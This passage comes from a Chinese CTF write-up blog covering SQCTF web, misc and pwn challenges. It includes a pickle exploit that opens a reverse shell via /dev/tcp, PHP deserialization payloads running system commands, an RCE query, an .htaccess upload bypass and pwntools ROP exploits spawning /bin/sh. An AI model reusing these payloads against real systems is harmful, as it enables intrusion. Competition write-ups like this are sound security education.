class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30761/&#x27;</span></span><br><span class="line"></span><br><span class="line">with requests.<span class="title function_ invoke__">Session</span>() <span class="keyword">as</span> s:</span><br><span class="line">    <span class="comment"># 获取初始页面并计算答案</span></span><br><span class="line">    response = s.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line">    soup = <span class="title function_ invoke__">BeautifulSoup</span>(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    expression = soup.<span class="title function_ invoke__">find</span>(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;challenge&#x27;</span>).text.<span class="title function_ invoke__">strip</span>()</span><br><span class="line">    result = <span class="keyword">eval</span>(expression)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提交计算结果</span></span><br><span class="line">    s.<span class="title function_ invoke__">post</span>(url, data=&#123;<span class="string">&#x27;value&#x27;</span>: result&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 自动访问flag页面</span></span><br><span class="line">    flag_response = s.<span class="title function_ invoke__">get</span>(url + <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    flag_soup = <span class="title function_ invoke__">BeautifulSoup</span>(flag_response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取并打印flag</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;最终Flag：&quot;</span>, flag_soup.text.<span class="title function_ invoke__">strip</span>())</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-78.png"></p><h3 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h3><p>点击Github会下载一个PDF</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-79.png"></p><p>获得账号密码</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-80.png"></p><p>访问<code>/login.php</code>进入登录口，并用获得的账号密码登录即可获得flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-81.png"></p><h3 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h3><p>改个<code>Content-Length</code>继续传</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-82.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-83.png"></p><h3 id="哎呀大大大黑塔"><a href="#哎呀大大大黑塔" class="headerlink" title="哎呀大大大黑塔"></a>哎呀大大大黑塔</h3><p>这题主要是一开始的脑洞，去B站看大黑塔的PV，用BV号当参数。。。</p><p><code>?SQNU=BV1tXckehEd3</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-84.png"></p><p>一个简单的反序列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secret</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Secret</span>(<span class="string">&quot;SQCTF&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">// O:6:&quot;Secret&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;SQCTF&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-85.png"></p><h3 id="白月光"><a href="#白月光" class="headerlink" title="白月光"></a>白月光</h3><p>一个SSTI，用fenjing直接出</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-86.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-87.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m fenjing crack -u http://challenge.qsnctf.com:31268/ --inputs name --method POST</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-88.png"></p><h3 id="RceMe"><a href="#RceMe" class="headerlink" title="RceMe"></a>RceMe</h3><p><code>GET：?com=nl /*</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-89.png"></p><h3 id="Through"><a href="#Through" class="headerlink" title="Through"></a>Through</h3><p>用双写绕过路径过滤</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-90.png"></p><h3 id="开发人员的小失误"><a href="#开发人员的小失误" class="headerlink" title="开发人员的小失误"></a>开发人员的小失误</h3><p>目录爆破</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-91.png"></p><p>访问即可获得flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-92.png"></p><h3 id="ggoodd"><a href="#ggoodd" class="headerlink" title="ggoodd"></a>ggoodd</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:32116/&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&#x27;json&#x27;</span>: <span class="string">&#x27;&#123;&quot;x&quot;:&quot;cba&quot;&#125;&#x27;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;abc&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.<span class="title function_ invoke__">post</span>(url, params=params, data=data)</span><br><span class="line"><span class="keyword">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-93.png"></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>千查万别<br>直接读环境变量<code>/proc/1/envirom</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-94.png"></p><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p>简单的pickle，直接反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 直接触发文件读取操作</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/23333 0&gt;&amp;1&quot;&#x27;)&quot;&quot;&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成ASCII安全payload</span></span><br><span class="line">payload = pickle.dumps(Exploit(), protocol=<span class="number">0</span>)</span><br><span class="line">b64_payload = base64.b64encode(payload).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最终Payload: <span class="subst">&#123;b64_payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-95.png"></p><h3 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h3><p>手动打开开发者工具</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-96.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-97.png"></p><h3 id="自私的小s"><a href="#自私的小s" class="headerlink" title="自私的小s"></a>自私的小s</h3><p>真正的入口在cookie处</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-98.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-99.png"></p><p>简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Genshin_impact</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>; </span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Genshin_impact</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理私有属性格式（PHP序列化私有属性的特殊格式）</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;s:20:&quot;&#x27;</span>.<span class="string">&quot;\0Genshin_impact\0value&quot;</span>.<span class="string">&#x27;&quot;;&#x27;</span>, // 原始格式</span><br><span class="line">        <span class="string">&#x27;%&#x27;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;S:20:&quot;\00Genshin_impact\00value&quot;;&#x27;</span>,    // 转换为大写S的十六进制表示</span><br><span class="line">        <span class="string">&#x27;nonono&#x27;</span>                               // 替换可能存在的%符号</span><br><span class="line">    ],</span><br><span class="line">    <span class="variable">$payload</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">// O%3A14%3A%22Genshin_impact%22%3A1%3A%7Bs%3A21%3A%22%00Genshin_impact%00value%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure><h3 id="Look-for-the-homepage"><a href="#Look-for-the-homepage" class="headerlink" title="Look for the homepage"></a>Look for the homepage</h3><p><code>F12</code>抓个包即可看到<code>challenge.php</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-100.png"></p><p><code>$verify_code === $code &amp;&amp;$pass1 === $flag</code>直接用数组绕过</p><p><code>parse_str</code>存在变量覆盖漏洞，使<code>fly</code>等于<code>value3</code>参数的md5值即可</p><p>最终payload</p><p><code>GET：verify[]=1&amp;pass1[]=2&amp;pass2=welcome&amp;value3=1</code></p><p><code>POST：value1=fly=c4ca4238a0b923820dcc509a6f75849b</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-101.png"></p><h3 id="Are-you-from-SQNU"><a href="#Are-you-from-SQNU" class="headerlink" title="Are you from SQNU?"></a>Are you from SQNU?</h3><p>传参见下图</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-102.png"></p><h3 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h3><p>伪造cookie就行</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-103.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-104.png"></p><h3 id="图片展示功能"><a href="#图片展示功能" class="headerlink" title="图片展示功能"></a>图片展示功能</h3><p>前面两个上传绕过方法都不行了</p><p>直接上传个<code>.htaccess</code>配置文件，配置文件里面意思是在当前目录下，所有文件都会被解析成php代码执行</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-105.png"></p><p>然后再上传个<code>1.phtm</code>文件上去</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-106.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-107.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="可否许我再少年"><a href="#可否许我再少年" class="headerlink" title="可否许我再少年"></a>可否许我再少年</h3><p><img src="https://img.beiko.top/blog/2025/4/28/image-108.png"></p><h3 id="Welcome-Sign-in（一血）"><a href="#Welcome-Sign-in（一血）" class="headerlink" title="Welcome_Sign_in（一血）"></a>Welcome_Sign_in（一血）</h3><p>找公众号要就行</p><p><font style="color:rgb(238, 238, 238);"></font></p><h3 id="ez-music1"><a href="#ez-music1" class="headerlink" title="ez_music1"></a>ez_music1</h3><p><img src="https://img.beiko.top/blog/2025/4/28/image-109.png"></p><h3 id="love-host"><a href="#love-host" class="headerlink" title="love.host"></a>love.host</h3><p>用<code>foremost</code>分解图片，flag在压缩包里面</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-110.png"></p><h3 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h3><p>试了半天的图片隐写，结果在一个网站直接出flag。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.a.tools/Tool.php?Id=100</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-111.png"></p><h3 id="piet"><a href="#piet" class="headerlink" title="piet"></a>piet</h3><p>对应参考文章出的：<a href="https://blog.csdn.net/MarkRao/article/details/121796707">https://blog.csdn.net/MarkRao/article/details/121796707</a></p><p>工具下载：<a href="https://www.bertnase.de/npiet/npiet-1.3a-win32.zip">https://www.bertnase.de/npiet/npiet-1.3a-win32.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\npiet.exe -tpic .\<span class="number">1</span>.png</span><br><span class="line">SQCTF&#123;Hello world!&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-112.png"></p><h3 id="YuanShen-Start"><a href="#YuanShen-Start" class="headerlink" title="YuanShen_Start!"></a>YuanShen_Start!</h3><p>第一个压缩包密码<code>SQCTF&#123;yuan_shen_1s_a_good_game!&#125;</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-113.png"></p><p>用上面得到的密码解压<code>原神启动.zip</code></p><p>翻看文档内容移开白色图片得到第二个密码：<code>SQCTF&#123;f968566s-3fb6-4bfd-885a-d9e102528784&#125;</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-114.png"></p><p>把<code>docx</code>后缀改为<code>zip</code>就能看到个压缩包</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-115.png"></p><p>把<code>image1.png</code>用010打开</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-116.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-117.png"></p><p>得到第三个密码<code>SQCTF&#123;6bb238u7r-6574-a7e6-0etg-7gsdycvdv27&#125;</code></p><p>用图片里面的密码解压<code>img.zip</code>然后再用文档里面的密码解压<code>text.txt</code>获得真正的flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-118.png"></p><h3 id="老君山的落日好美"><a href="#老君山的落日好美" class="headerlink" title="老君山的落日好美"></a>老君山的落日好美</h3><p>爆破压缩包获得密码<code>1352681</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-119.png"></p><p>看到图片右下角有明显FFT隐写的变形痕迹</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-120.png"></p><p>PuzzleSolver直接出</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-121.png"></p><h3 id="王者荣耀真是太好玩了"><a href="#王者荣耀真是太好玩了" class="headerlink" title="王者荣耀真是太好玩了"></a>王者荣耀真是太好玩了</h3><p>根据图片里面的人在王者搜</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-122.png"></p><p>然后在百度地图搜<code>辉煌烟草</code>就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-123.png"></p><h3 id="这是什么加密（一血）"><a href="#这是什么加密（一血）" class="headerlink" title="这是什么加密（一血）"></a>这是什么加密（一血）</h3><p>一眼XY 2024的base2048秒了</p><p><a href="https://nerdmosis.com/tools/encode-and-decode-base2048">https://nerdmosis.com/tools/encode-and-decode-base2048</a></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-124.png"></p><h3 id="小巷人家"><a href="#小巷人家" class="headerlink" title="小巷人家"></a>小巷人家</h3><p>压缩包名为<code>寺庙名</code>，直接谷歌搜图</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-125.png"></p><p>flag为<code>SQCTF&#123;西园寺&#125;</code></p><h3 id="FFT-IFFT"><a href="#FFT-IFFT" class="headerlink" title="FFT IFFT"></a>FFT IFFT</h3><p>一道基于傅里叶变换域处理的题目，编写脚本恢复原来的视频</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import cv2</span><br><span class="line">import struct</span><br><span class="line">import numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">reconstruct_video</span>():</span><br><span class="line">    <span class="comment"># 创建输出目录</span></span><br><span class="line">    os.<span class="title function_ invoke__">makedirs</span>(<span class="string">&#x27;reconstructed_frames&#x27;</span>, exist_ok=True)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取r文件中的min和max值（大端格式）</span></span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.<span class="title function_ invoke__">read</span>()</span><br><span class="line">        num_frames = <span class="title function_ invoke__">len</span>(data) <span class="comment">// 8  # 每个帧占8字节</span></span><br><span class="line">        min_max_values = [struct.<span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;!ff&#x27;</span>, data[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]) <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(num_frames)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(num_frames):</span><br><span class="line">        <span class="comment"># 生成三位数文件名，例如001.png</span></span><br><span class="line">        filename = f<span class="string">&quot;&#123;i+1:03d&#125;.png&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理幅度谱</span></span><br><span class="line">        m_path = os.path.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;m&#x27;</span>, filename)</span><br><span class="line">        m_img = cv2.<span class="title function_ invoke__">imread</span>(m_path, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        <span class="keyword">if</span> m_img is None:</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;错误：无法读取&#123;m_path&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反归一化幅度</span></span><br><span class="line">        min_val, max_val = min_max_values[i]</span><br><span class="line">        m_float = m_img.<span class="title function_ invoke__">astype</span>(np.float32)</span><br><span class="line">        log_amplitude = (m_float / <span class="number">255.0</span>) * (max_val - min_val) + min_val</span><br><span class="line">        amplitude = np.<span class="title function_ invoke__">exp</span>(log_amplitude)  <span class="comment"># 得到原始幅度</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理相位谱</span></span><br><span class="line">        p_path = os.path.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;p&#x27;</span>, filename)</span><br><span class="line">        p_img = cv2.<span class="title function_ invoke__">imread</span>(p_path, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        <span class="keyword">if</span> p_img is None:</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;错误：无法读取&#123;p_path&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反归一化相位到[-π, π]</span></span><br><span class="line">        p_float = p_img.<span class="title function_ invoke__">astype</span>(np.float32)</span><br><span class="line">        phase = (p_float / <span class="number">255.0</span>) * <span class="number">2</span> * np.pi - np.pi</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 重建FFT复数矩阵</span></span><br><span class="line">        fft_complex = amplitude * np.<span class="title function_ invoke__">exp</span>(<span class="number">1</span>j * phase)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 逆FFT变换</span></span><br><span class="line">        img_inv = np.fft.<span class="title function_ invoke__">ifft2</span>(np.fft.<span class="title function_ invoke__">ifftshift</span>(fft_complex))</span><br><span class="line">        img_inv = np.<span class="keyword">real</span>(img_inv)</span><br><span class="line">        img_inv = np.<span class="title function_ invoke__">clip</span>(img_inv, <span class="number">0</span>, <span class="number">255</span>).<span class="title function_ invoke__">astype</span>(np.uint8)  <span class="comment"># 转换为灰度图</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 保存重建的帧</span></span><br><span class="line">        cv2.<span class="title function_ invoke__">imwrite</span>(f<span class="string">&#x27;reconstructed_frames/&#123;filename&#125;&#x27;</span>, img_inv)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用ffmpeg合成视频</span></span><br><span class="line">    <span class="comment">// os.system(&#x27;ffmpeg -y -i reconstructed_frames/%03d.png -r 25 output.mp4&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_ invoke__">reconstruct_video</span>()</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-126.png"></p><p>因为我没有直接安装ffmpeg，所以手动执行视频重建（其实也可以不用，上面恢复出来的flag其实很明显了）</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-127.png"></p><p>成功恢复视频</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-128.png"></p><p>flag为：<code>SQCTF&#123;HELLO&#125;</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h3><p><img src="https://img.beiko.top/blog/2025/4/28/image-129.png"></p><h3 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h3><p>只要输入超过76个字符即可获得shell</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-130.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-131.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-132.png"></p><h3 id="被酒莫惊春睡重"><a href="#被酒莫惊春睡重" class="headerlink" title="被酒莫惊春睡重"></a>被酒莫惊春睡重</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">32349</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">rop = <span class="number">0x00000000004011e0</span> <span class="comment"># pop rdx ; pop rsi ; pop rdi ; pop rax ; ret</span></span><br><span class="line">syscall = <span class="number">0x4011EC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x401487&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;请输入你的名字:&quot;</span>,<span class="string">&quot;carl&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;(1-3):&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,cyclic(<span class="number">0x20</span>),rop,<span class="number">0</span>,<span class="number">0</span>,stack,<span class="number">0x3b</span>,syscall])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;字符）:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span 